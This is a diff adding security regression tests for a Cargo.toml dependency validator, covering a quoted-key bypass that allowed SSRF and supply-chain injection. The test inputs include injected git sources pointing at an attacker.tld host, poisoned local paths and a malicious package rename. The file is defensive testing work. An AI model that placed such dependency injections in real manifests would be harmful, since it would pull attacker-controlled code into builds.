@@ -21,7 +21,7 @@
  * matrix.
  */
 import { describe, test, expect } from "bun:test";
-import { validateAnchorExtraDeps } from "../src/build/differential-build.ts";
+import { validateAnchorExtraDeps, assertScaffoldDepsSafe } from "../src/build/differential-build.ts";
 import { AnvilError } from "../src/errors.ts";
 
 function expectThrowsAnvilError(fn: () => unknown, matchSubstring: string): void {
@@ -164,5 +164,104 @@ describe("validateAnchorExtraDeps — refusals", () => {
     );
     // Allowlisted-and-quoted should pass.
     expect(validateAnchorExtraDeps(`"anchor-spl" = "0.31"`)).toBeTruthy();
+  });
+});
+
+describe("validateAnchorExtraDeps — quoted-key bypass (SSRF)", () => {
+  // The banned-key regex `\bgit\s*=` could not see a QUOTED key: the closing
+  // quote in `"git" =` breaks the git→= adjacency, so `{ "git" = "attacker" }`
+  // sailed through and cargo cloned the attacker URL during the out-of-sandbox
+  // fetch. The allowlist parses KEYS, so quoting no longer helps.
+  test(`double-quoted "git" key → 400`, () => {
+    expectThrowsAnvilError(
+      () => validateAnchorExtraDeps(`spl-memo = { "git" = "https://attacker.tld/evil-spl-memo" }`),
+      "git",
+    );
+  });
+
+  test(`single-quoted 'path' key → 400`, () => {
+    expectThrowsAnvilError(
+      () => validateAnchorExtraDeps(`spl-memo = { 'path' = "/tmp/poisoned" }`),
+      "path",
+    );
+  });
+
+  test(`quoted "package" rename alongside a valid version → 400`, () => {
+    expectThrowsAnvilError(
+      () => validateAnchorExtraDeps(`bytemuck = { version = "1", "package" = "totally-evil-crate" }`),
+      "package",
+    );
+  });
+
+  test("a value string containing '=' or ',' does not spawn a phantom key", () => {
+    // `features = ["a=b,c"]` is allowed — the parser must not treat the inner
+    // '=' as a key delimiter and reject a made-up key.
+    expect(validateAnchorExtraDeps(`anchor-spl = { version = "0.31", features = ["a=b,c"] }`)).toBeTruthy();
+  });
+
+  test("default-features = false passes (allowlisted key)", () => {
+    expect(validateAnchorExtraDeps(`bytemuck = { version = "1.13", default-features = false }`)).toBeTruthy();
+  });
+
+  test("an unknown non-source key (workspace) is still refused (fail-closed)", () => {
+    expectThrowsAnvilError(
+      () => validateAnchorExtraDeps(`bytemuck = { workspace = true }`),
+      "workspace",
+    );
+  });
+});
+
+describe("assertScaffoldDepsSafe — client scaffold Cargo.toml (R5)", () => {
+  const cargo = (body: string) => [{ path: "Cargo.toml", content: body }];
+
+  test("a legit pinocchio/borsh scaffold passes (no crate-name allowlist)", () => {
+    expect(() => assertScaffoldDepsSafe(cargo(
+      `[package]\nname = "prog"\n[dependencies]\npinocchio = "0.7"\nborsh = { version = "1", features = ["derive"] }\n`,
+    ))).not.toThrow();
+  });
+
+  test("non-Cargo.toml files are ignored", () => {
+    expect(() => assertScaffoldDepsSafe([{ path: "src/lib.rs", content: `git = "https://x"` }])).not.toThrow();
+  });
+
+  test("flat inline-table git source → 400", () => {
+    expectThrowsAnvilError(
+      () => assertScaffoldDepsSafe(cargo(`[dependencies]\nevil = { git = "https://attacker.tld/x" }\n`)),
+      "git",
+    );
+  });
+
+  test("quoted git key in scaffold → 400", () => {
+    expectThrowsAnvilError(
+      () => assertScaffoldDepsSafe(cargo(`[dependencies]\nevil = { "git" = "https://attacker.tld/x" }\n`)),
+      "git",
+    );
+  });
+
+  test("per-crate section `[dependencies.evil]` + path → 400", () => {
+    expectThrowsAnvilError(
+      () => assertScaffoldDepsSafe(cargo(`[dependencies.evil]\npath = "/tmp/poison"\n`)),
+      "path",
+    );
+  });
+
+  test("per-crate section with only version/features passes", () => {
+    expect(() => assertScaffoldDepsSafe(cargo(
+      `[dependencies.borsh]\nversion = "1"\nfeatures = ["derive"]\n`,
+    ))).not.toThrow();
+  });
+
+  test("build-dependencies git source is also caught", () => {
+    expectThrowsAnvilError(
+      () => assertScaffoldDepsSafe(cargo(`[build-dependencies]\nevil = { git = "https://x" }\n`)),
+      "git",
+    );
+  });
+
+  test("target-cfg dependencies git source is caught", () => {
+    expectThrowsAnvilError(
+      () => assertScaffoldDepsSafe(cargo(`[target.'cfg(unix)'.dependencies]\nevil = { git = "https://x" }\n`)),
+      "git",
+    );
   });
 });
